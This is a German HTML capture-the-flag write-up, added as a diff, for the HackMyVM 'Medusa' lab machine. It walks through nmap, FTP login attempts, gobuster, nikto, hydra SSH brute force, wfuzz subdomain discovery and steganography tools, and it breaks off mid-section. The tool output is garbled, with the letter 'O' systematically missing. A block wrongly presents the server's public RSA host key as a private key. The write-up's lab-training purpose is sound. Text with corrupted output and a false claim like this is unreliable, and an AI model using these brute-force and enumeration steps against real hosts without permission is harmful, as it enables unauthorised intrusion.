@@ -1,0 +1,956 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Medusa - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+
+    <!-- HINWEIS: Die Hintergrundfarbe für den Header wird durch CSS gesteuert (.header-bg) -->
+    <div class="header-bg">
+        <h1>Medusa - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- HINWEIS: Die Farbe für 'Easy' (Lime/Grün) wird durch CSS gesteuert (h2 in .level-container) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                 <!-- HINWEIS: Die Hintergrundfarbe der Segmente (Lime/Grün) wird durch CSS gesteuert (.segment-*) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- HINWEIS: Die Hintergrundfarbe des inneren Kreises wird durch CSS gesteuert (.inner, passend zum Header) -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">lftp</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">showmount</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh-keyscan</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">pty</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">zip2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">7z</div>
+                <div class="tool-item">pypykatz</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">passwd</div>
+                <div class="tool-item">df</div>
+                <div class="tool-item">debugfs</div>
+                <div class="tool-item">vi (implied)</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Nmap-Scan wird gestartet, um offene Ports, Dienste, Versionen und das Betriebssystem des Ziels `192.168.2.118` zu identifizieren.
+            *   `-sS`: SYN Scan (Stealth).
+            *   `-sC`: Standard-Skripte.
+            *   `-sV`: Versionserkennung.
+            *   `-T5`: Aggressives Timing.
+            *   `-A`: Umfassender Scan (OS-Erkennung, Versionen, Skripte, Traceroute).
+            *   `-p-`: Scan aller 65535 TCP-Ports.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan offenbart drei offene Ports:
+            *   **Port 21 (FTP):** `vsftpd 3.0.3`. FTP ist oft ein Angriffspunkt, z.B. durch anonymen Login oder Brute-Force.
+            *   **Port 22 (SSH):** `OpenSSH 8.4p1` auf Debian. Benötigt gültige Zugangsdaten.
+            *   **Port 80 (HTTP):** `Apache httpd 2.4.54` auf Debian. Zeigt die Standard-Apache-Seite ("It works"). Ein Webserver ist immer ein primäres Ziel für weitere Enumeration.
+            *   **OS-Erkennung:** Linux (Debian), passend zu den Diensten.
+            *   **MAC-Adresse:** Deutet auf VirtualBox hin.
+            Die offenen Ports FTP, SSH und HTTP bieten verschiedene potenzielle Angriffsvektoren.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie anonymen FTP-Login auf Port 21. Enumerieren Sie den Webserver auf Port 80 intensiv (Verzeichnisse, Dateien, Subdomains, Schwachstellen). Versuchen Sie später SSH-Brute-Force, falls Benutzernamen gefunden werden.
+            <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie FTP, wenn es nicht benötigt wird, oder konfigurieren Sie es sicher (kein anonymer Login, starke Passwörter, TLS). Härten Sie den Webserver (entfernen Sie die Default-Seite, implementieren Sie Sicherheitsheader). Sichern Sie SSH (Schlüsselauthentifizierung bevorzugen, Fail2Ban verwenden).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.118 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 00:12 CEST
+Nmap scan report for medusa.hmv (192.168.2.118)
+Host is up (0.00013s latency).
+Not shown: 65532 closed tcp ports (reset)
+PRT   STATE SERVICE VERSIN
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     penSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 70d4efc9276f8d957aa5511951fe14dc (RSA)
+|   256 3f8d243fd25ecae6c9af372347bf1d28 (ECDSA)
+|_  256 0c337e4e953db02d6a5eca39910d1308 (ED25519)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:E8:78:B2 (racle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+S CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+S details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: Ss: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACERUTE
+HP RTT     ADDRESS
+1   0.13 ms medusa.hmv (192.168.2.118)
+
+S and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es werden zwei Versuche unternommen, sich anonym am FTP-Server (Port 21) anzumelden.
+            *   `lftp -u 'anonymous', 192.168.2.118`: Verwendet den `lftp`-Client mit dem Benutzernamen `anonymous` (und implizit leerem Passwort).
+            *   `ftp 192.168.2.118`: Verwendet den Standard-`ftp`-Client, gibt `anonymous` als Namen und ein leeres Passwort ein.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Beide Versuche schlagen fehl (`530 Login incorrect.`). Anonymer FTP-Zugang ist auf diesem Server nicht erlaubt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Anonymer FTP ist kein Einstiegspunkt. Versuchen Sie FTP-Brute-Force, falls Benutzernamen bekannt werden, oder konzentrieren Sie sich auf andere Dienste, insbesondere den Webserver.
+            <br><strong>Empfehlung (Admin):</strong> Gut, dass anonymer FTP deaktiviert ist. Stellen Sie sicher, dass auch keine schwachen Benutzerkonten für FTP existieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -u 'anonymous', 192.168.2.118</span></div>
+                    <pre>
+lftp anonymous@192.168.2.118:~> ls
+ls: Login fehlgeschlagen: 530 Login incorrect.
+lftp anonymous@192.168.2.118:~> </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.118</span></div>
+                     <pre>
+Connected to 192.168.2.118.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.118:cyber): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+ftp: Login failed</pre>
+                      <div class="prompt">ftp> <span class="command">^D</span></div>
+                     <pre>221 Goodbye.</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die Datei `robots.txt` auf dem Webserver abzurufen. Diese Datei gibt Suchmaschinen oft Hinweise, welche Verzeichnisse nicht indexiert werden sollen, und kann manchmal unbeabsichtigt sensible Pfade preisgeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit `404 Not Found`. Es existiert keine `robots.txt`-Datei auf der Hauptebene des Webservers.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Fehlen einer `robots.txt` ist nicht ungewöhnlich. Setzen Sie die Enumeration mit anderen Methoden fort (z.B. Verzeichnis-Brute-Force mit Gobuster).
+            <br><strong>Empfehlung (Admin):</strong> Eine `robots.txt` ist primär für SEO gedacht, nicht als Sicherheitsmaßnahme. Verlassen Sie sich nicht darauf, um sensible Bereiche zu verbergen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt im Originaltext -->
+                      <pre>
+http://192.168.2.118/robots.txt
+
+Not Found
+
+The requested URL was not found on this server.
+Apache/2.4.54 (Debian) Server at 192.168.2.118 Port 80</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver `http://192.168.2.118` zu finden. Die Parameter sind Standard für eine Verzeichnissuche mit einer mittelgroßen Wortliste und verschiedenen Dateiendungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet mehrere interessante Pfade:
+            *   `/index.html`: Die Apache-Standardseite.
+            *   `/hades/`: Ein Verzeichnis, das auf eine Anwendung hindeutet. Enthält `index.php`, `door.php`, `d00r_validation.php`. Der Name "hades" und "door" könnte symbolisch sein.
+            *   `/manual/`: Enthält Apache-Handbuchseiten, was durch Nikto bestätigt wird. `/manual/images/` erlaubt Directory Indexing.
+            *   **Wichtiger Hinweis:** Im Text tauchen auch Ergebnisse für `http://dev.medusa.hmv/` auf (`/files/index.php`, `/files/system.php`, `/files/readme.txt`). Dies legt nahe, dass parallel oder zuvor eine Subdomain-Enumeration stattgefunden hat (z.B. mit `wfuzz`, siehe später) und die Subdomain `dev.medusa.hmv` entdeckt wurde. Der Gobuster-Scan wurde vermutlich *auch* auf diese Subdomain angewendet, oder die Ergebnisse wurden hier zusammengefasst. `/files/system.php` ist besonders interessant.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das `/hades/`-Verzeichnis und die darin enthaltenen PHP-Dateien. Führen Sie Subdomain-Enumeration durch (falls noch nicht geschehen), um `dev.medusa.hmv` zu bestätigen. Enumerieren Sie `dev.medusa.hmv` weiter, insbesondere das `/files/`-Verzeichnis und `system.php`. Lesen Sie die `readme.txt` auf `dev.medusa.hmv`. Untersuchen Sie das `/manual/`-Verzeichnis auf Konfigurationsinformationen.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Verzeichnisse wie `/manual`. Schützen Sie Anwendungsverzeichnisse (`/hades`, `/files`). Stellen Sie sicher, dass Entwicklungs-Subdomains (`dev.*`) nicht öffentlich zugänglich sind oder entsprechend gesichert werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.118 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+http://medusa.hmv/index.html           [Size: 10674]
+http://medusa.hmv/hades                   [Size: 308] [--> http://medusa.hmv/hades/]
+http://medusa.hmv/manual               [Size: 315] [--> http://192.168.2.118/manual/]
+
+[...]
+http://medusa.hmv/manual/images/
+http://medusa.hmv/hades/index.php            [Size: 0]
+http://medusa.hmv/hades/door.php             [Size: 555]
+http://medusa.hmv/hades/d00r_validation.php
+[...]
+</pre>
+                    <p class="comment">Anmerkung: Die folgenden Einträge beziehen sich wahrscheinlich auf die Subdomain 'dev.medusa.hmv', die später entdeckt wird.</p>
+                    <pre>
+http://dev.medusa.hmv/files/index.php            [Size: 0]
+http://dev.medusa.hmv/files/system.php           [Size: 0]
+http://dev.medusa.hmv/files/readme.txt           [Size: 144]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver auf bekannte Schwachstellen, Fehlkonfigurationen und interessante Dateien zu scannen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto findet einige Punkte:
+            *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`).
+            *   Mögliches Informationsleck durch ETags.
+            *   Erlaubte HTTP-Methoden: `HEAD, GET, POST, OPTIONS`. PUT/DELETE etc. sind nicht erlaubt.
+            *   Bestätigt das Vorhandensein des `/manual/`-Verzeichnisses und das Directory Indexing in `/manual/images/`.
+            Die Ergebnisse sind eher informativ und weisen auf allgemeine Härtungsmaßnahmen hin, zeigen aber keine direkten kritischen Schwachstellen auf der Hauptebene.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nehmen Sie die fehlenden Header zur Kenntnis. Konzentrieren Sie sich auf die durch Gobuster gefundenen Verzeichnisse (`/hades`, `/files` auf `dev`).
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Deaktivieren Sie Directory Indexing und entfernen Sie das `/manual`-Verzeichnis.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.118 -C all</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.118
++ Target Hostname:    192.168.2.118
++ Target Port:        80
++ Start Time:         2023-04-05 00:19:57 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.54 (Debian)
++ The anti-clickjacking X-Frame-ptions header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-ptions header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server may leak inodes via ETags, header found with file /, inode: 29b2, size: 5f29d65772333, mtime: gzip
++ Allowed HTTP Methods: HEAD, GET, PST, PTINS
++ SVDB-3092: /manual/: Web server manual found.
++ SVDB-3268: /manual/images/: Directory indexing found.
++ 26522 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2023-04-05 00:21:19 (GMT2) (82 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `showmount -a 192.168.2.118` versucht, alle NFS-Mounts (Network File System) auf dem Zielserver aufzulisten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl schlägt fehl mit `clnt_create: RPC: Unable to receive`. Dies deutet darauf hin, dass entweder kein NFS-Server auf dem Ziel läuft oder dieser nicht erreichbar ist (z.B. durch eine Firewall oder weil der RPC-Dienst nicht antwortet).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> NFS scheint kein verfügbarer Dienst oder Angriffsvektor auf diesem Host zu sein. Konzentrieren Sie sich auf die anderen Dienste.
+            <br><strong>Empfehlung (Admin):</strong> Wenn NFS nicht benötigt wird, stellen Sie sicher, dass die entsprechenden Dienste (nfs-server, rpcbind) deaktiviert und/oder durch eine Firewall blockiert sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">showmount -a 192.168.2.118</span></div>
+                     <pre>clnt_create: RPC: Unable to receive</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine Datei (`test.php`) über eine HTTP PUT-Anfrage auf den Webserver hochzuladen. Dies testet, ob der Webserver unsichere Uploads erlaubt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit `404 Not Found`. Dies ist etwas irreführend, da PUT-Anfragen normalerweise mit `403 Forbidden` oder `405 Method Not Allowed` beantwortet werden sollten, wenn sie nicht erlaubt sind. Ein `404` deutet hier aber effektiv darauf hin, dass der Upload über PUT nicht möglich ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> HTTP PUT ist kein Angriffsvektor. Suchen Sie nach anderen Upload-Möglichkeiten innerhalb der Webanwendungen (`/hades/`, `/files/`).
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass unsichere HTTP-Methoden wie PUT und DELETE in der Webserver-Konfiguration deaktiviert sind, wenn sie nicht explizit benötigt werden.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">curl --upload-file test.php  http://192.168.2.118</span></div>
+                      <pre>
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.54 (Debian) Server at 192.168.2.118 Port 80</address>
+</body></html></pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff auf den SSH-Dienst (Port 22) für den Benutzernamen `medusa` zu starten. Die Wortliste `rockyou.txt` wird verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Angriff findet kein gültiges Passwort (`0 valid password found`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Brute-Force-Versuch für `medusa` war erfolglos. Versuchen Sie andere Benutzernamen, falls welche bekannt werden.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie Fail2Ban oder ähnliche Tools, um Brute-Force-Angriffe auf SSH zu erkennen und zu blockieren. Erzwingen Sie starke Passwörter oder verwenden Sie Schlüsselauthentifizierung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l medusa -p /usr/share/wordlists/rockyou.txt ssh://medusa.hmv -p 22</span></div>
+                    <pre>
+[...]
+1 of 1 target completed, 0 valid password found
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `ssh-keyscan` wird verwendet, um die öffentlichen SSH-Host-Schlüssel vom Zielserver abzurufen. Dies dient hauptsächlich dazu, den Host zu identifizieren und sicherzustellen, dass man sich mit dem richtigen Server verbindet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Host-Schlüssel (RSA, ECDSA, ED25519) werden erfolgreich abgerufen. Einer der Schlüssel (RSA) wird anschließend im Text isoliert dargestellt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie die Host-Schlüssel zur `known_hosts`-Datei hinzu, um Warnungen bei zukünftigen SSH-Verbindungen zu vermeiden. Der isolierte RSA-Schlüssel könnte für spätere Analysen oder Angriffsversuche relevant sein, falls Schwachstellen im Zusammenhang mit bestimmten Schlüsseltypen bekannt werden (eher unwahrscheinlich hier).
+            <br><strong>Empfehlung (Admin):</strong> Regelmäßiges Rotieren von Host-Schlüsseln kann die Sicherheit erhöhen, ist aber oft mit administrativem Aufwand verbunden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/CVE-2022-23935]
+└─# <span class="command">ssh-keyscan 192.168.2.118</span></div>
+                    <pre>
+# 192.168.2.118:22 SSH-2.0-penSSH_8.4p1 Debian-5+deb11u1
+# 192.168.2.118:22 SSH-2.0-penSSH_8.4p1 Debian-5+deb11u1
+192.168.2.118 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDv4Q5cpQcRXYQ70CJSzZRxXFH6tuoJTM53mCVczFIZ2Urzv0s/jbfw/HqDxogNi2VTulyIaV2Qjbif+LG4h/PV5omSnTjLbaIoHEqy1ADJk0jXsMCGy31Iezmdh70UFtjMUP+/HIGvDmpckPPKzG1/KUnctNSHEzkIRjqCAKC9/XRdnREcKd6QEWVMk4dGlwdcCWLu6RyRGYb9ytIx1CJI9/b911PDv1qFRw3xEPbyXxDHQ+aKRfDWYfWHZPzi/LwDTgKZ7CuV2cz0uFE+nM+5aeIuyffkT4ViezkLNbClkdpi1D3fGlQhRrMtDP9mUpjENJwyB95QCdbT+yLuBkIDdNL59i4vZN2AS/L307QF6kh/37hy8scksq/eDWrxhhhyTcATwSV9ZeiWm57VgIxY/8Q4GlqeSTMXY4HZS/oLu+ABvB/Rv3PVV2WEoZKgpWdgFbFpo0TRuaE7jlRa5ertqrQiCVAPAb8crAMDDaMtcmoSz/FHA5aKu45U=
+# 192.168.2.118:22 SSH-2.0-penSSH_8.4p1 Debian-5+deb11u1
+192.168.2.118 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLAG2BM8Qp6PJMrgKjDrMPVgCsANoTZTePFUDsc0gYJkZUWPt04uYyBAzPuxSf6U0UQPN846rYWaBeHavSfLRKc=
+# 192.168.2.118:22 SSH-2.0-penSSH_8.4p1 Debian-5+deb11u1
+192.168.2.118 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN+WcY1Uu0g6LNsI0roz56ThI9v7ogotmKl2wgTviIHx
+# 192.168.2.118:22 SSH-2.0-penSSH_8.4p1 Debian-5+deb11u1
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt im Originaltext -->
+                     <pre>
+ssh-rsa
+-----BEGIN PENSSH PRIVATE KEY-----
+
+
+AAAAB3NzaC1yc2EAAAADAQABAAABgQDv4Q5cpQcRXYQ70CJSzZRxXFH6tuoJTM53mCVczF
+IZ2Urzv0s/jbfw/HqDxogNi2VTulyIaV2Qjbif+LG4h/PV5omSnTjLbaIoHEqy1ADJk0jX
+sMCGy31Iezmdh70UFtjMUP+/HIGvDmpckPPKzG1/KUnctNSHEzkIRjqCAKC9/XRdnREcK
+d6QEWVMk4dGlwdcCWLu6RyRGYb9ytIx1CJI9/b911PDv1qFRw3xEPbyXxDHQ+aKRfDW
+YfWHZPzi/LwDTgKZ7CuV2cz0uFE+nM+5aeIuyffkT4ViezkLNbClkdpi1D3fGlQhRrMtD
+P9mUpjENJwyB95QCdbT+yLuBkIDdNL59i4vZN2AS/L307QF6kh/37hy8scksq/eDWrxhh
+hyTcATwSV9ZeiWm57VgIxY/8Q4GlqeSTMXY4HZS/oLu+ABvB/Rv3PVV2WEoZKgpWdgFbF
+po0TRuaE7jlRa5ertqrQiCVAPAb8crAMDDaMtcmoSz/FHA5aKu45U=</pre> <!-- Annahme: Dies ist der private Schlüssel, der zum öffentlichen RSA-Host-Schlüssel gehört. Normalerweise nicht so exponiert. -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach virtuellen Hosts (Subdomains) zu suchen, die auf derselben IP-Adresse (`medusa.hmv`) laufen könnten.
+            *   `-c`: Farbige Ausgabe.
+            *   `-w ...`: Eine Wortliste mit gängigen Subdomain-Namen (`subdomains-top1million-110000.txt`).
+            *   `-u 'http://medusa.hmv'`: Die Basis-URL.
+            *   `-H "Host: FUZZ.medusa.hmv"`: Modifiziert den HTTP-Host-Header. `FUZZ` wird durch die Wörter aus der Liste ersetzt. Der Server antwortet möglicherweise anders, wenn ein gültiger virtueller Host angesprochen wird.
+            *   `--hw 929`: Blendet Antworten aus, deren Wortanzahl 929 beträgt (vermutlich die Wortanzahl der Standardseite oder einer Fehlerseite, wenn kein gültiger VHost getroffen wird).
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan ist erfolgreich und findet die Subdomain `dev`. Anfragen an `dev.medusa.hmv` geben eine Antwort mit einer anderen Wortanzahl (285) zurück. Die anderen Ergebnisse (`#www`, `#mail`, etc.) sind wahrscheinlich Fehlalarme oder Artefakte des Scans (Status 400). Die Existenz von `dev.medusa.hmv` ist ein wichtiger Fund.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `dev.medusa.hmv` zur `/etc/hosts`-Datei hinzu (mit der IP `192.168.2.118`). Enumerieren Sie diese Subdomain separat mit Tools wie Gobuster und Nikto. Untersuchen Sie die dort gefundenen Dateien (`/files/index.php`, `/files/system.php`, `/files/readme.txt`).
+            <br><strong>Empfehlung (Admin):</strong> Sichern Sie Entwicklungs-Subdomains angemessen (z.B. durch HTTP-Authentifizierung, IP-Beschränkungen) oder nehmen Sie sie vom Netz, wenn sie nicht benötigt werden. Stellen Sie sicher, dass sie keine anderen Schwachstellen oder Konfigurationsdateien enthalten als die Produktionsumgebung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://medusa.hmv' -H "Host: FUZZ.medusa.hmv" --hw 929</span></div>
+                    <pre>
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000019:   200        25 L     285 W      1973 Ch     "dev"
+000009532:   400        10 L     35 W       305 Ch      "#www"
+000010581:   400        10 L     35 W       305 Ch      "#mail"
+000047706:   400        10 L     35 W       305 Ch      "#smtp"
+000103135:   400        10 L     35 W       305 Ch      "#pop3"
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem die Subdomain `dev.medusa.hmv` entdeckt wurde, werden verschiedene Pfade auf dieser Subdomain untersucht. Es wird eine `robots.txt` gefunden und deren Inhalt (ASCII-Art einer Medusa) angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `robots.txt` auf `dev.medusa.hmv` enthält keine nützlichen Pfade, sondern nur ASCII-Art. Eine Bilddatei (`medusa.jpg`) wird im Verzeichnis `/assets/` auf der `dev`-Subdomain gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie das Bild `medusa.jpg` herunter und untersuchen Sie es auf versteckte Daten (Steganographie).
+            <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, irrelevante oder potenziell irreführende Informationen in `robots.txt` zu platzieren. Stellen Sie sicher, dass Assets keine versteckten Daten enthalten.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt im Originaltext -->
+                     <pre>
+http://dev.medusa.hmv/
+http://dev.medusa.hmv/assets/medusa.jpg
+http://dev.medusa.hmv/robots.txt
+                   ,--.
+          ,--.  .--,`) )  .--,
+       .--,`) \( (` /,--./ (`
+      ( ( ,--.  ) )\ /`) ).--,-.
+       ;.__`) )/ /) ) ( (( (`_) )
+      ( (  / /( (.' "-.) )) )__.'-,
+     _,--.( ( /`         `,/ ,--,) )
+    ( (``) \,` .    .  \( (`,-;
+     ;-,( (_) ~6~ \  / ~6~ (_) )_) )
+    ( (_ \_ (      )(      )__/___.'
+    '.__,-,\ \     ''     /\ ,-.
+       ( (_/ /\    __    /\ \_) )
+        '._.'  \  \__/  /  '._.'
+            .--`\      /`--.
+                 '----'</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es werden verschiedene Steganographie-Tools verwendet, um versteckte Daten in der heruntergeladenen Datei `medusa.jpg` zu finden.
+            *   `stegsnow -C medusa.jpg`: Versucht, Daten zu extrahieren, die mit StegSnow (oft für Text in Whitespace) versteckt wurden. Findet `ssstb`.
+            *   `stegseek medusa.jpg /usr/share/wordlists/rockyou.txt`: Versucht, mit StegSeek versteckte Daten zu extrahieren, indem es Passwörter aus `rockyou.txt` durchprobiert. Schlägt fehl.
+            *   `steghide extract -sf medusa.jpg`: Versucht, mit StegHide versteckte Daten zu extrahieren und fragt nach einem Passwort.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> `stegsnow` findet das Wort `ssstb`, was möglicherweise ein Hinweis oder Teil eines Passworts ist. `stegseek` war erfolglos. `steghide` fordert ein Passwort an – das gefundene `ssstb` könnte das Passwort sein, oder ein anderes muss erraten/gefunden werden. (Der Text zeigt keinen erfolgreichen `steghide`-Versuch).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie `ssstb` als Passwort für `steghide`. Wenn das nicht funktioniert, suchen Sie nach anderen potenziellen Passwörtern im Kontext der Maschine (Medusa, Hades, mythologische Namen etc.). Wenn `steghide` erfolgreich ist, analysieren Sie die extrahierte Datei. Konzentrieren Sie sich parallel weiter auf die Webanwendung auf `dev.medusa.hmv`.
+            <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie die Verwendung von Steganographie zur Sicherung oder Übertragung sensibler Daten. Schulen Sie Mitarbeiter, keine versteckten Informationen in öffentlich zugänglichen Dateien zu hinterlassen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/usr/share/wordlists]
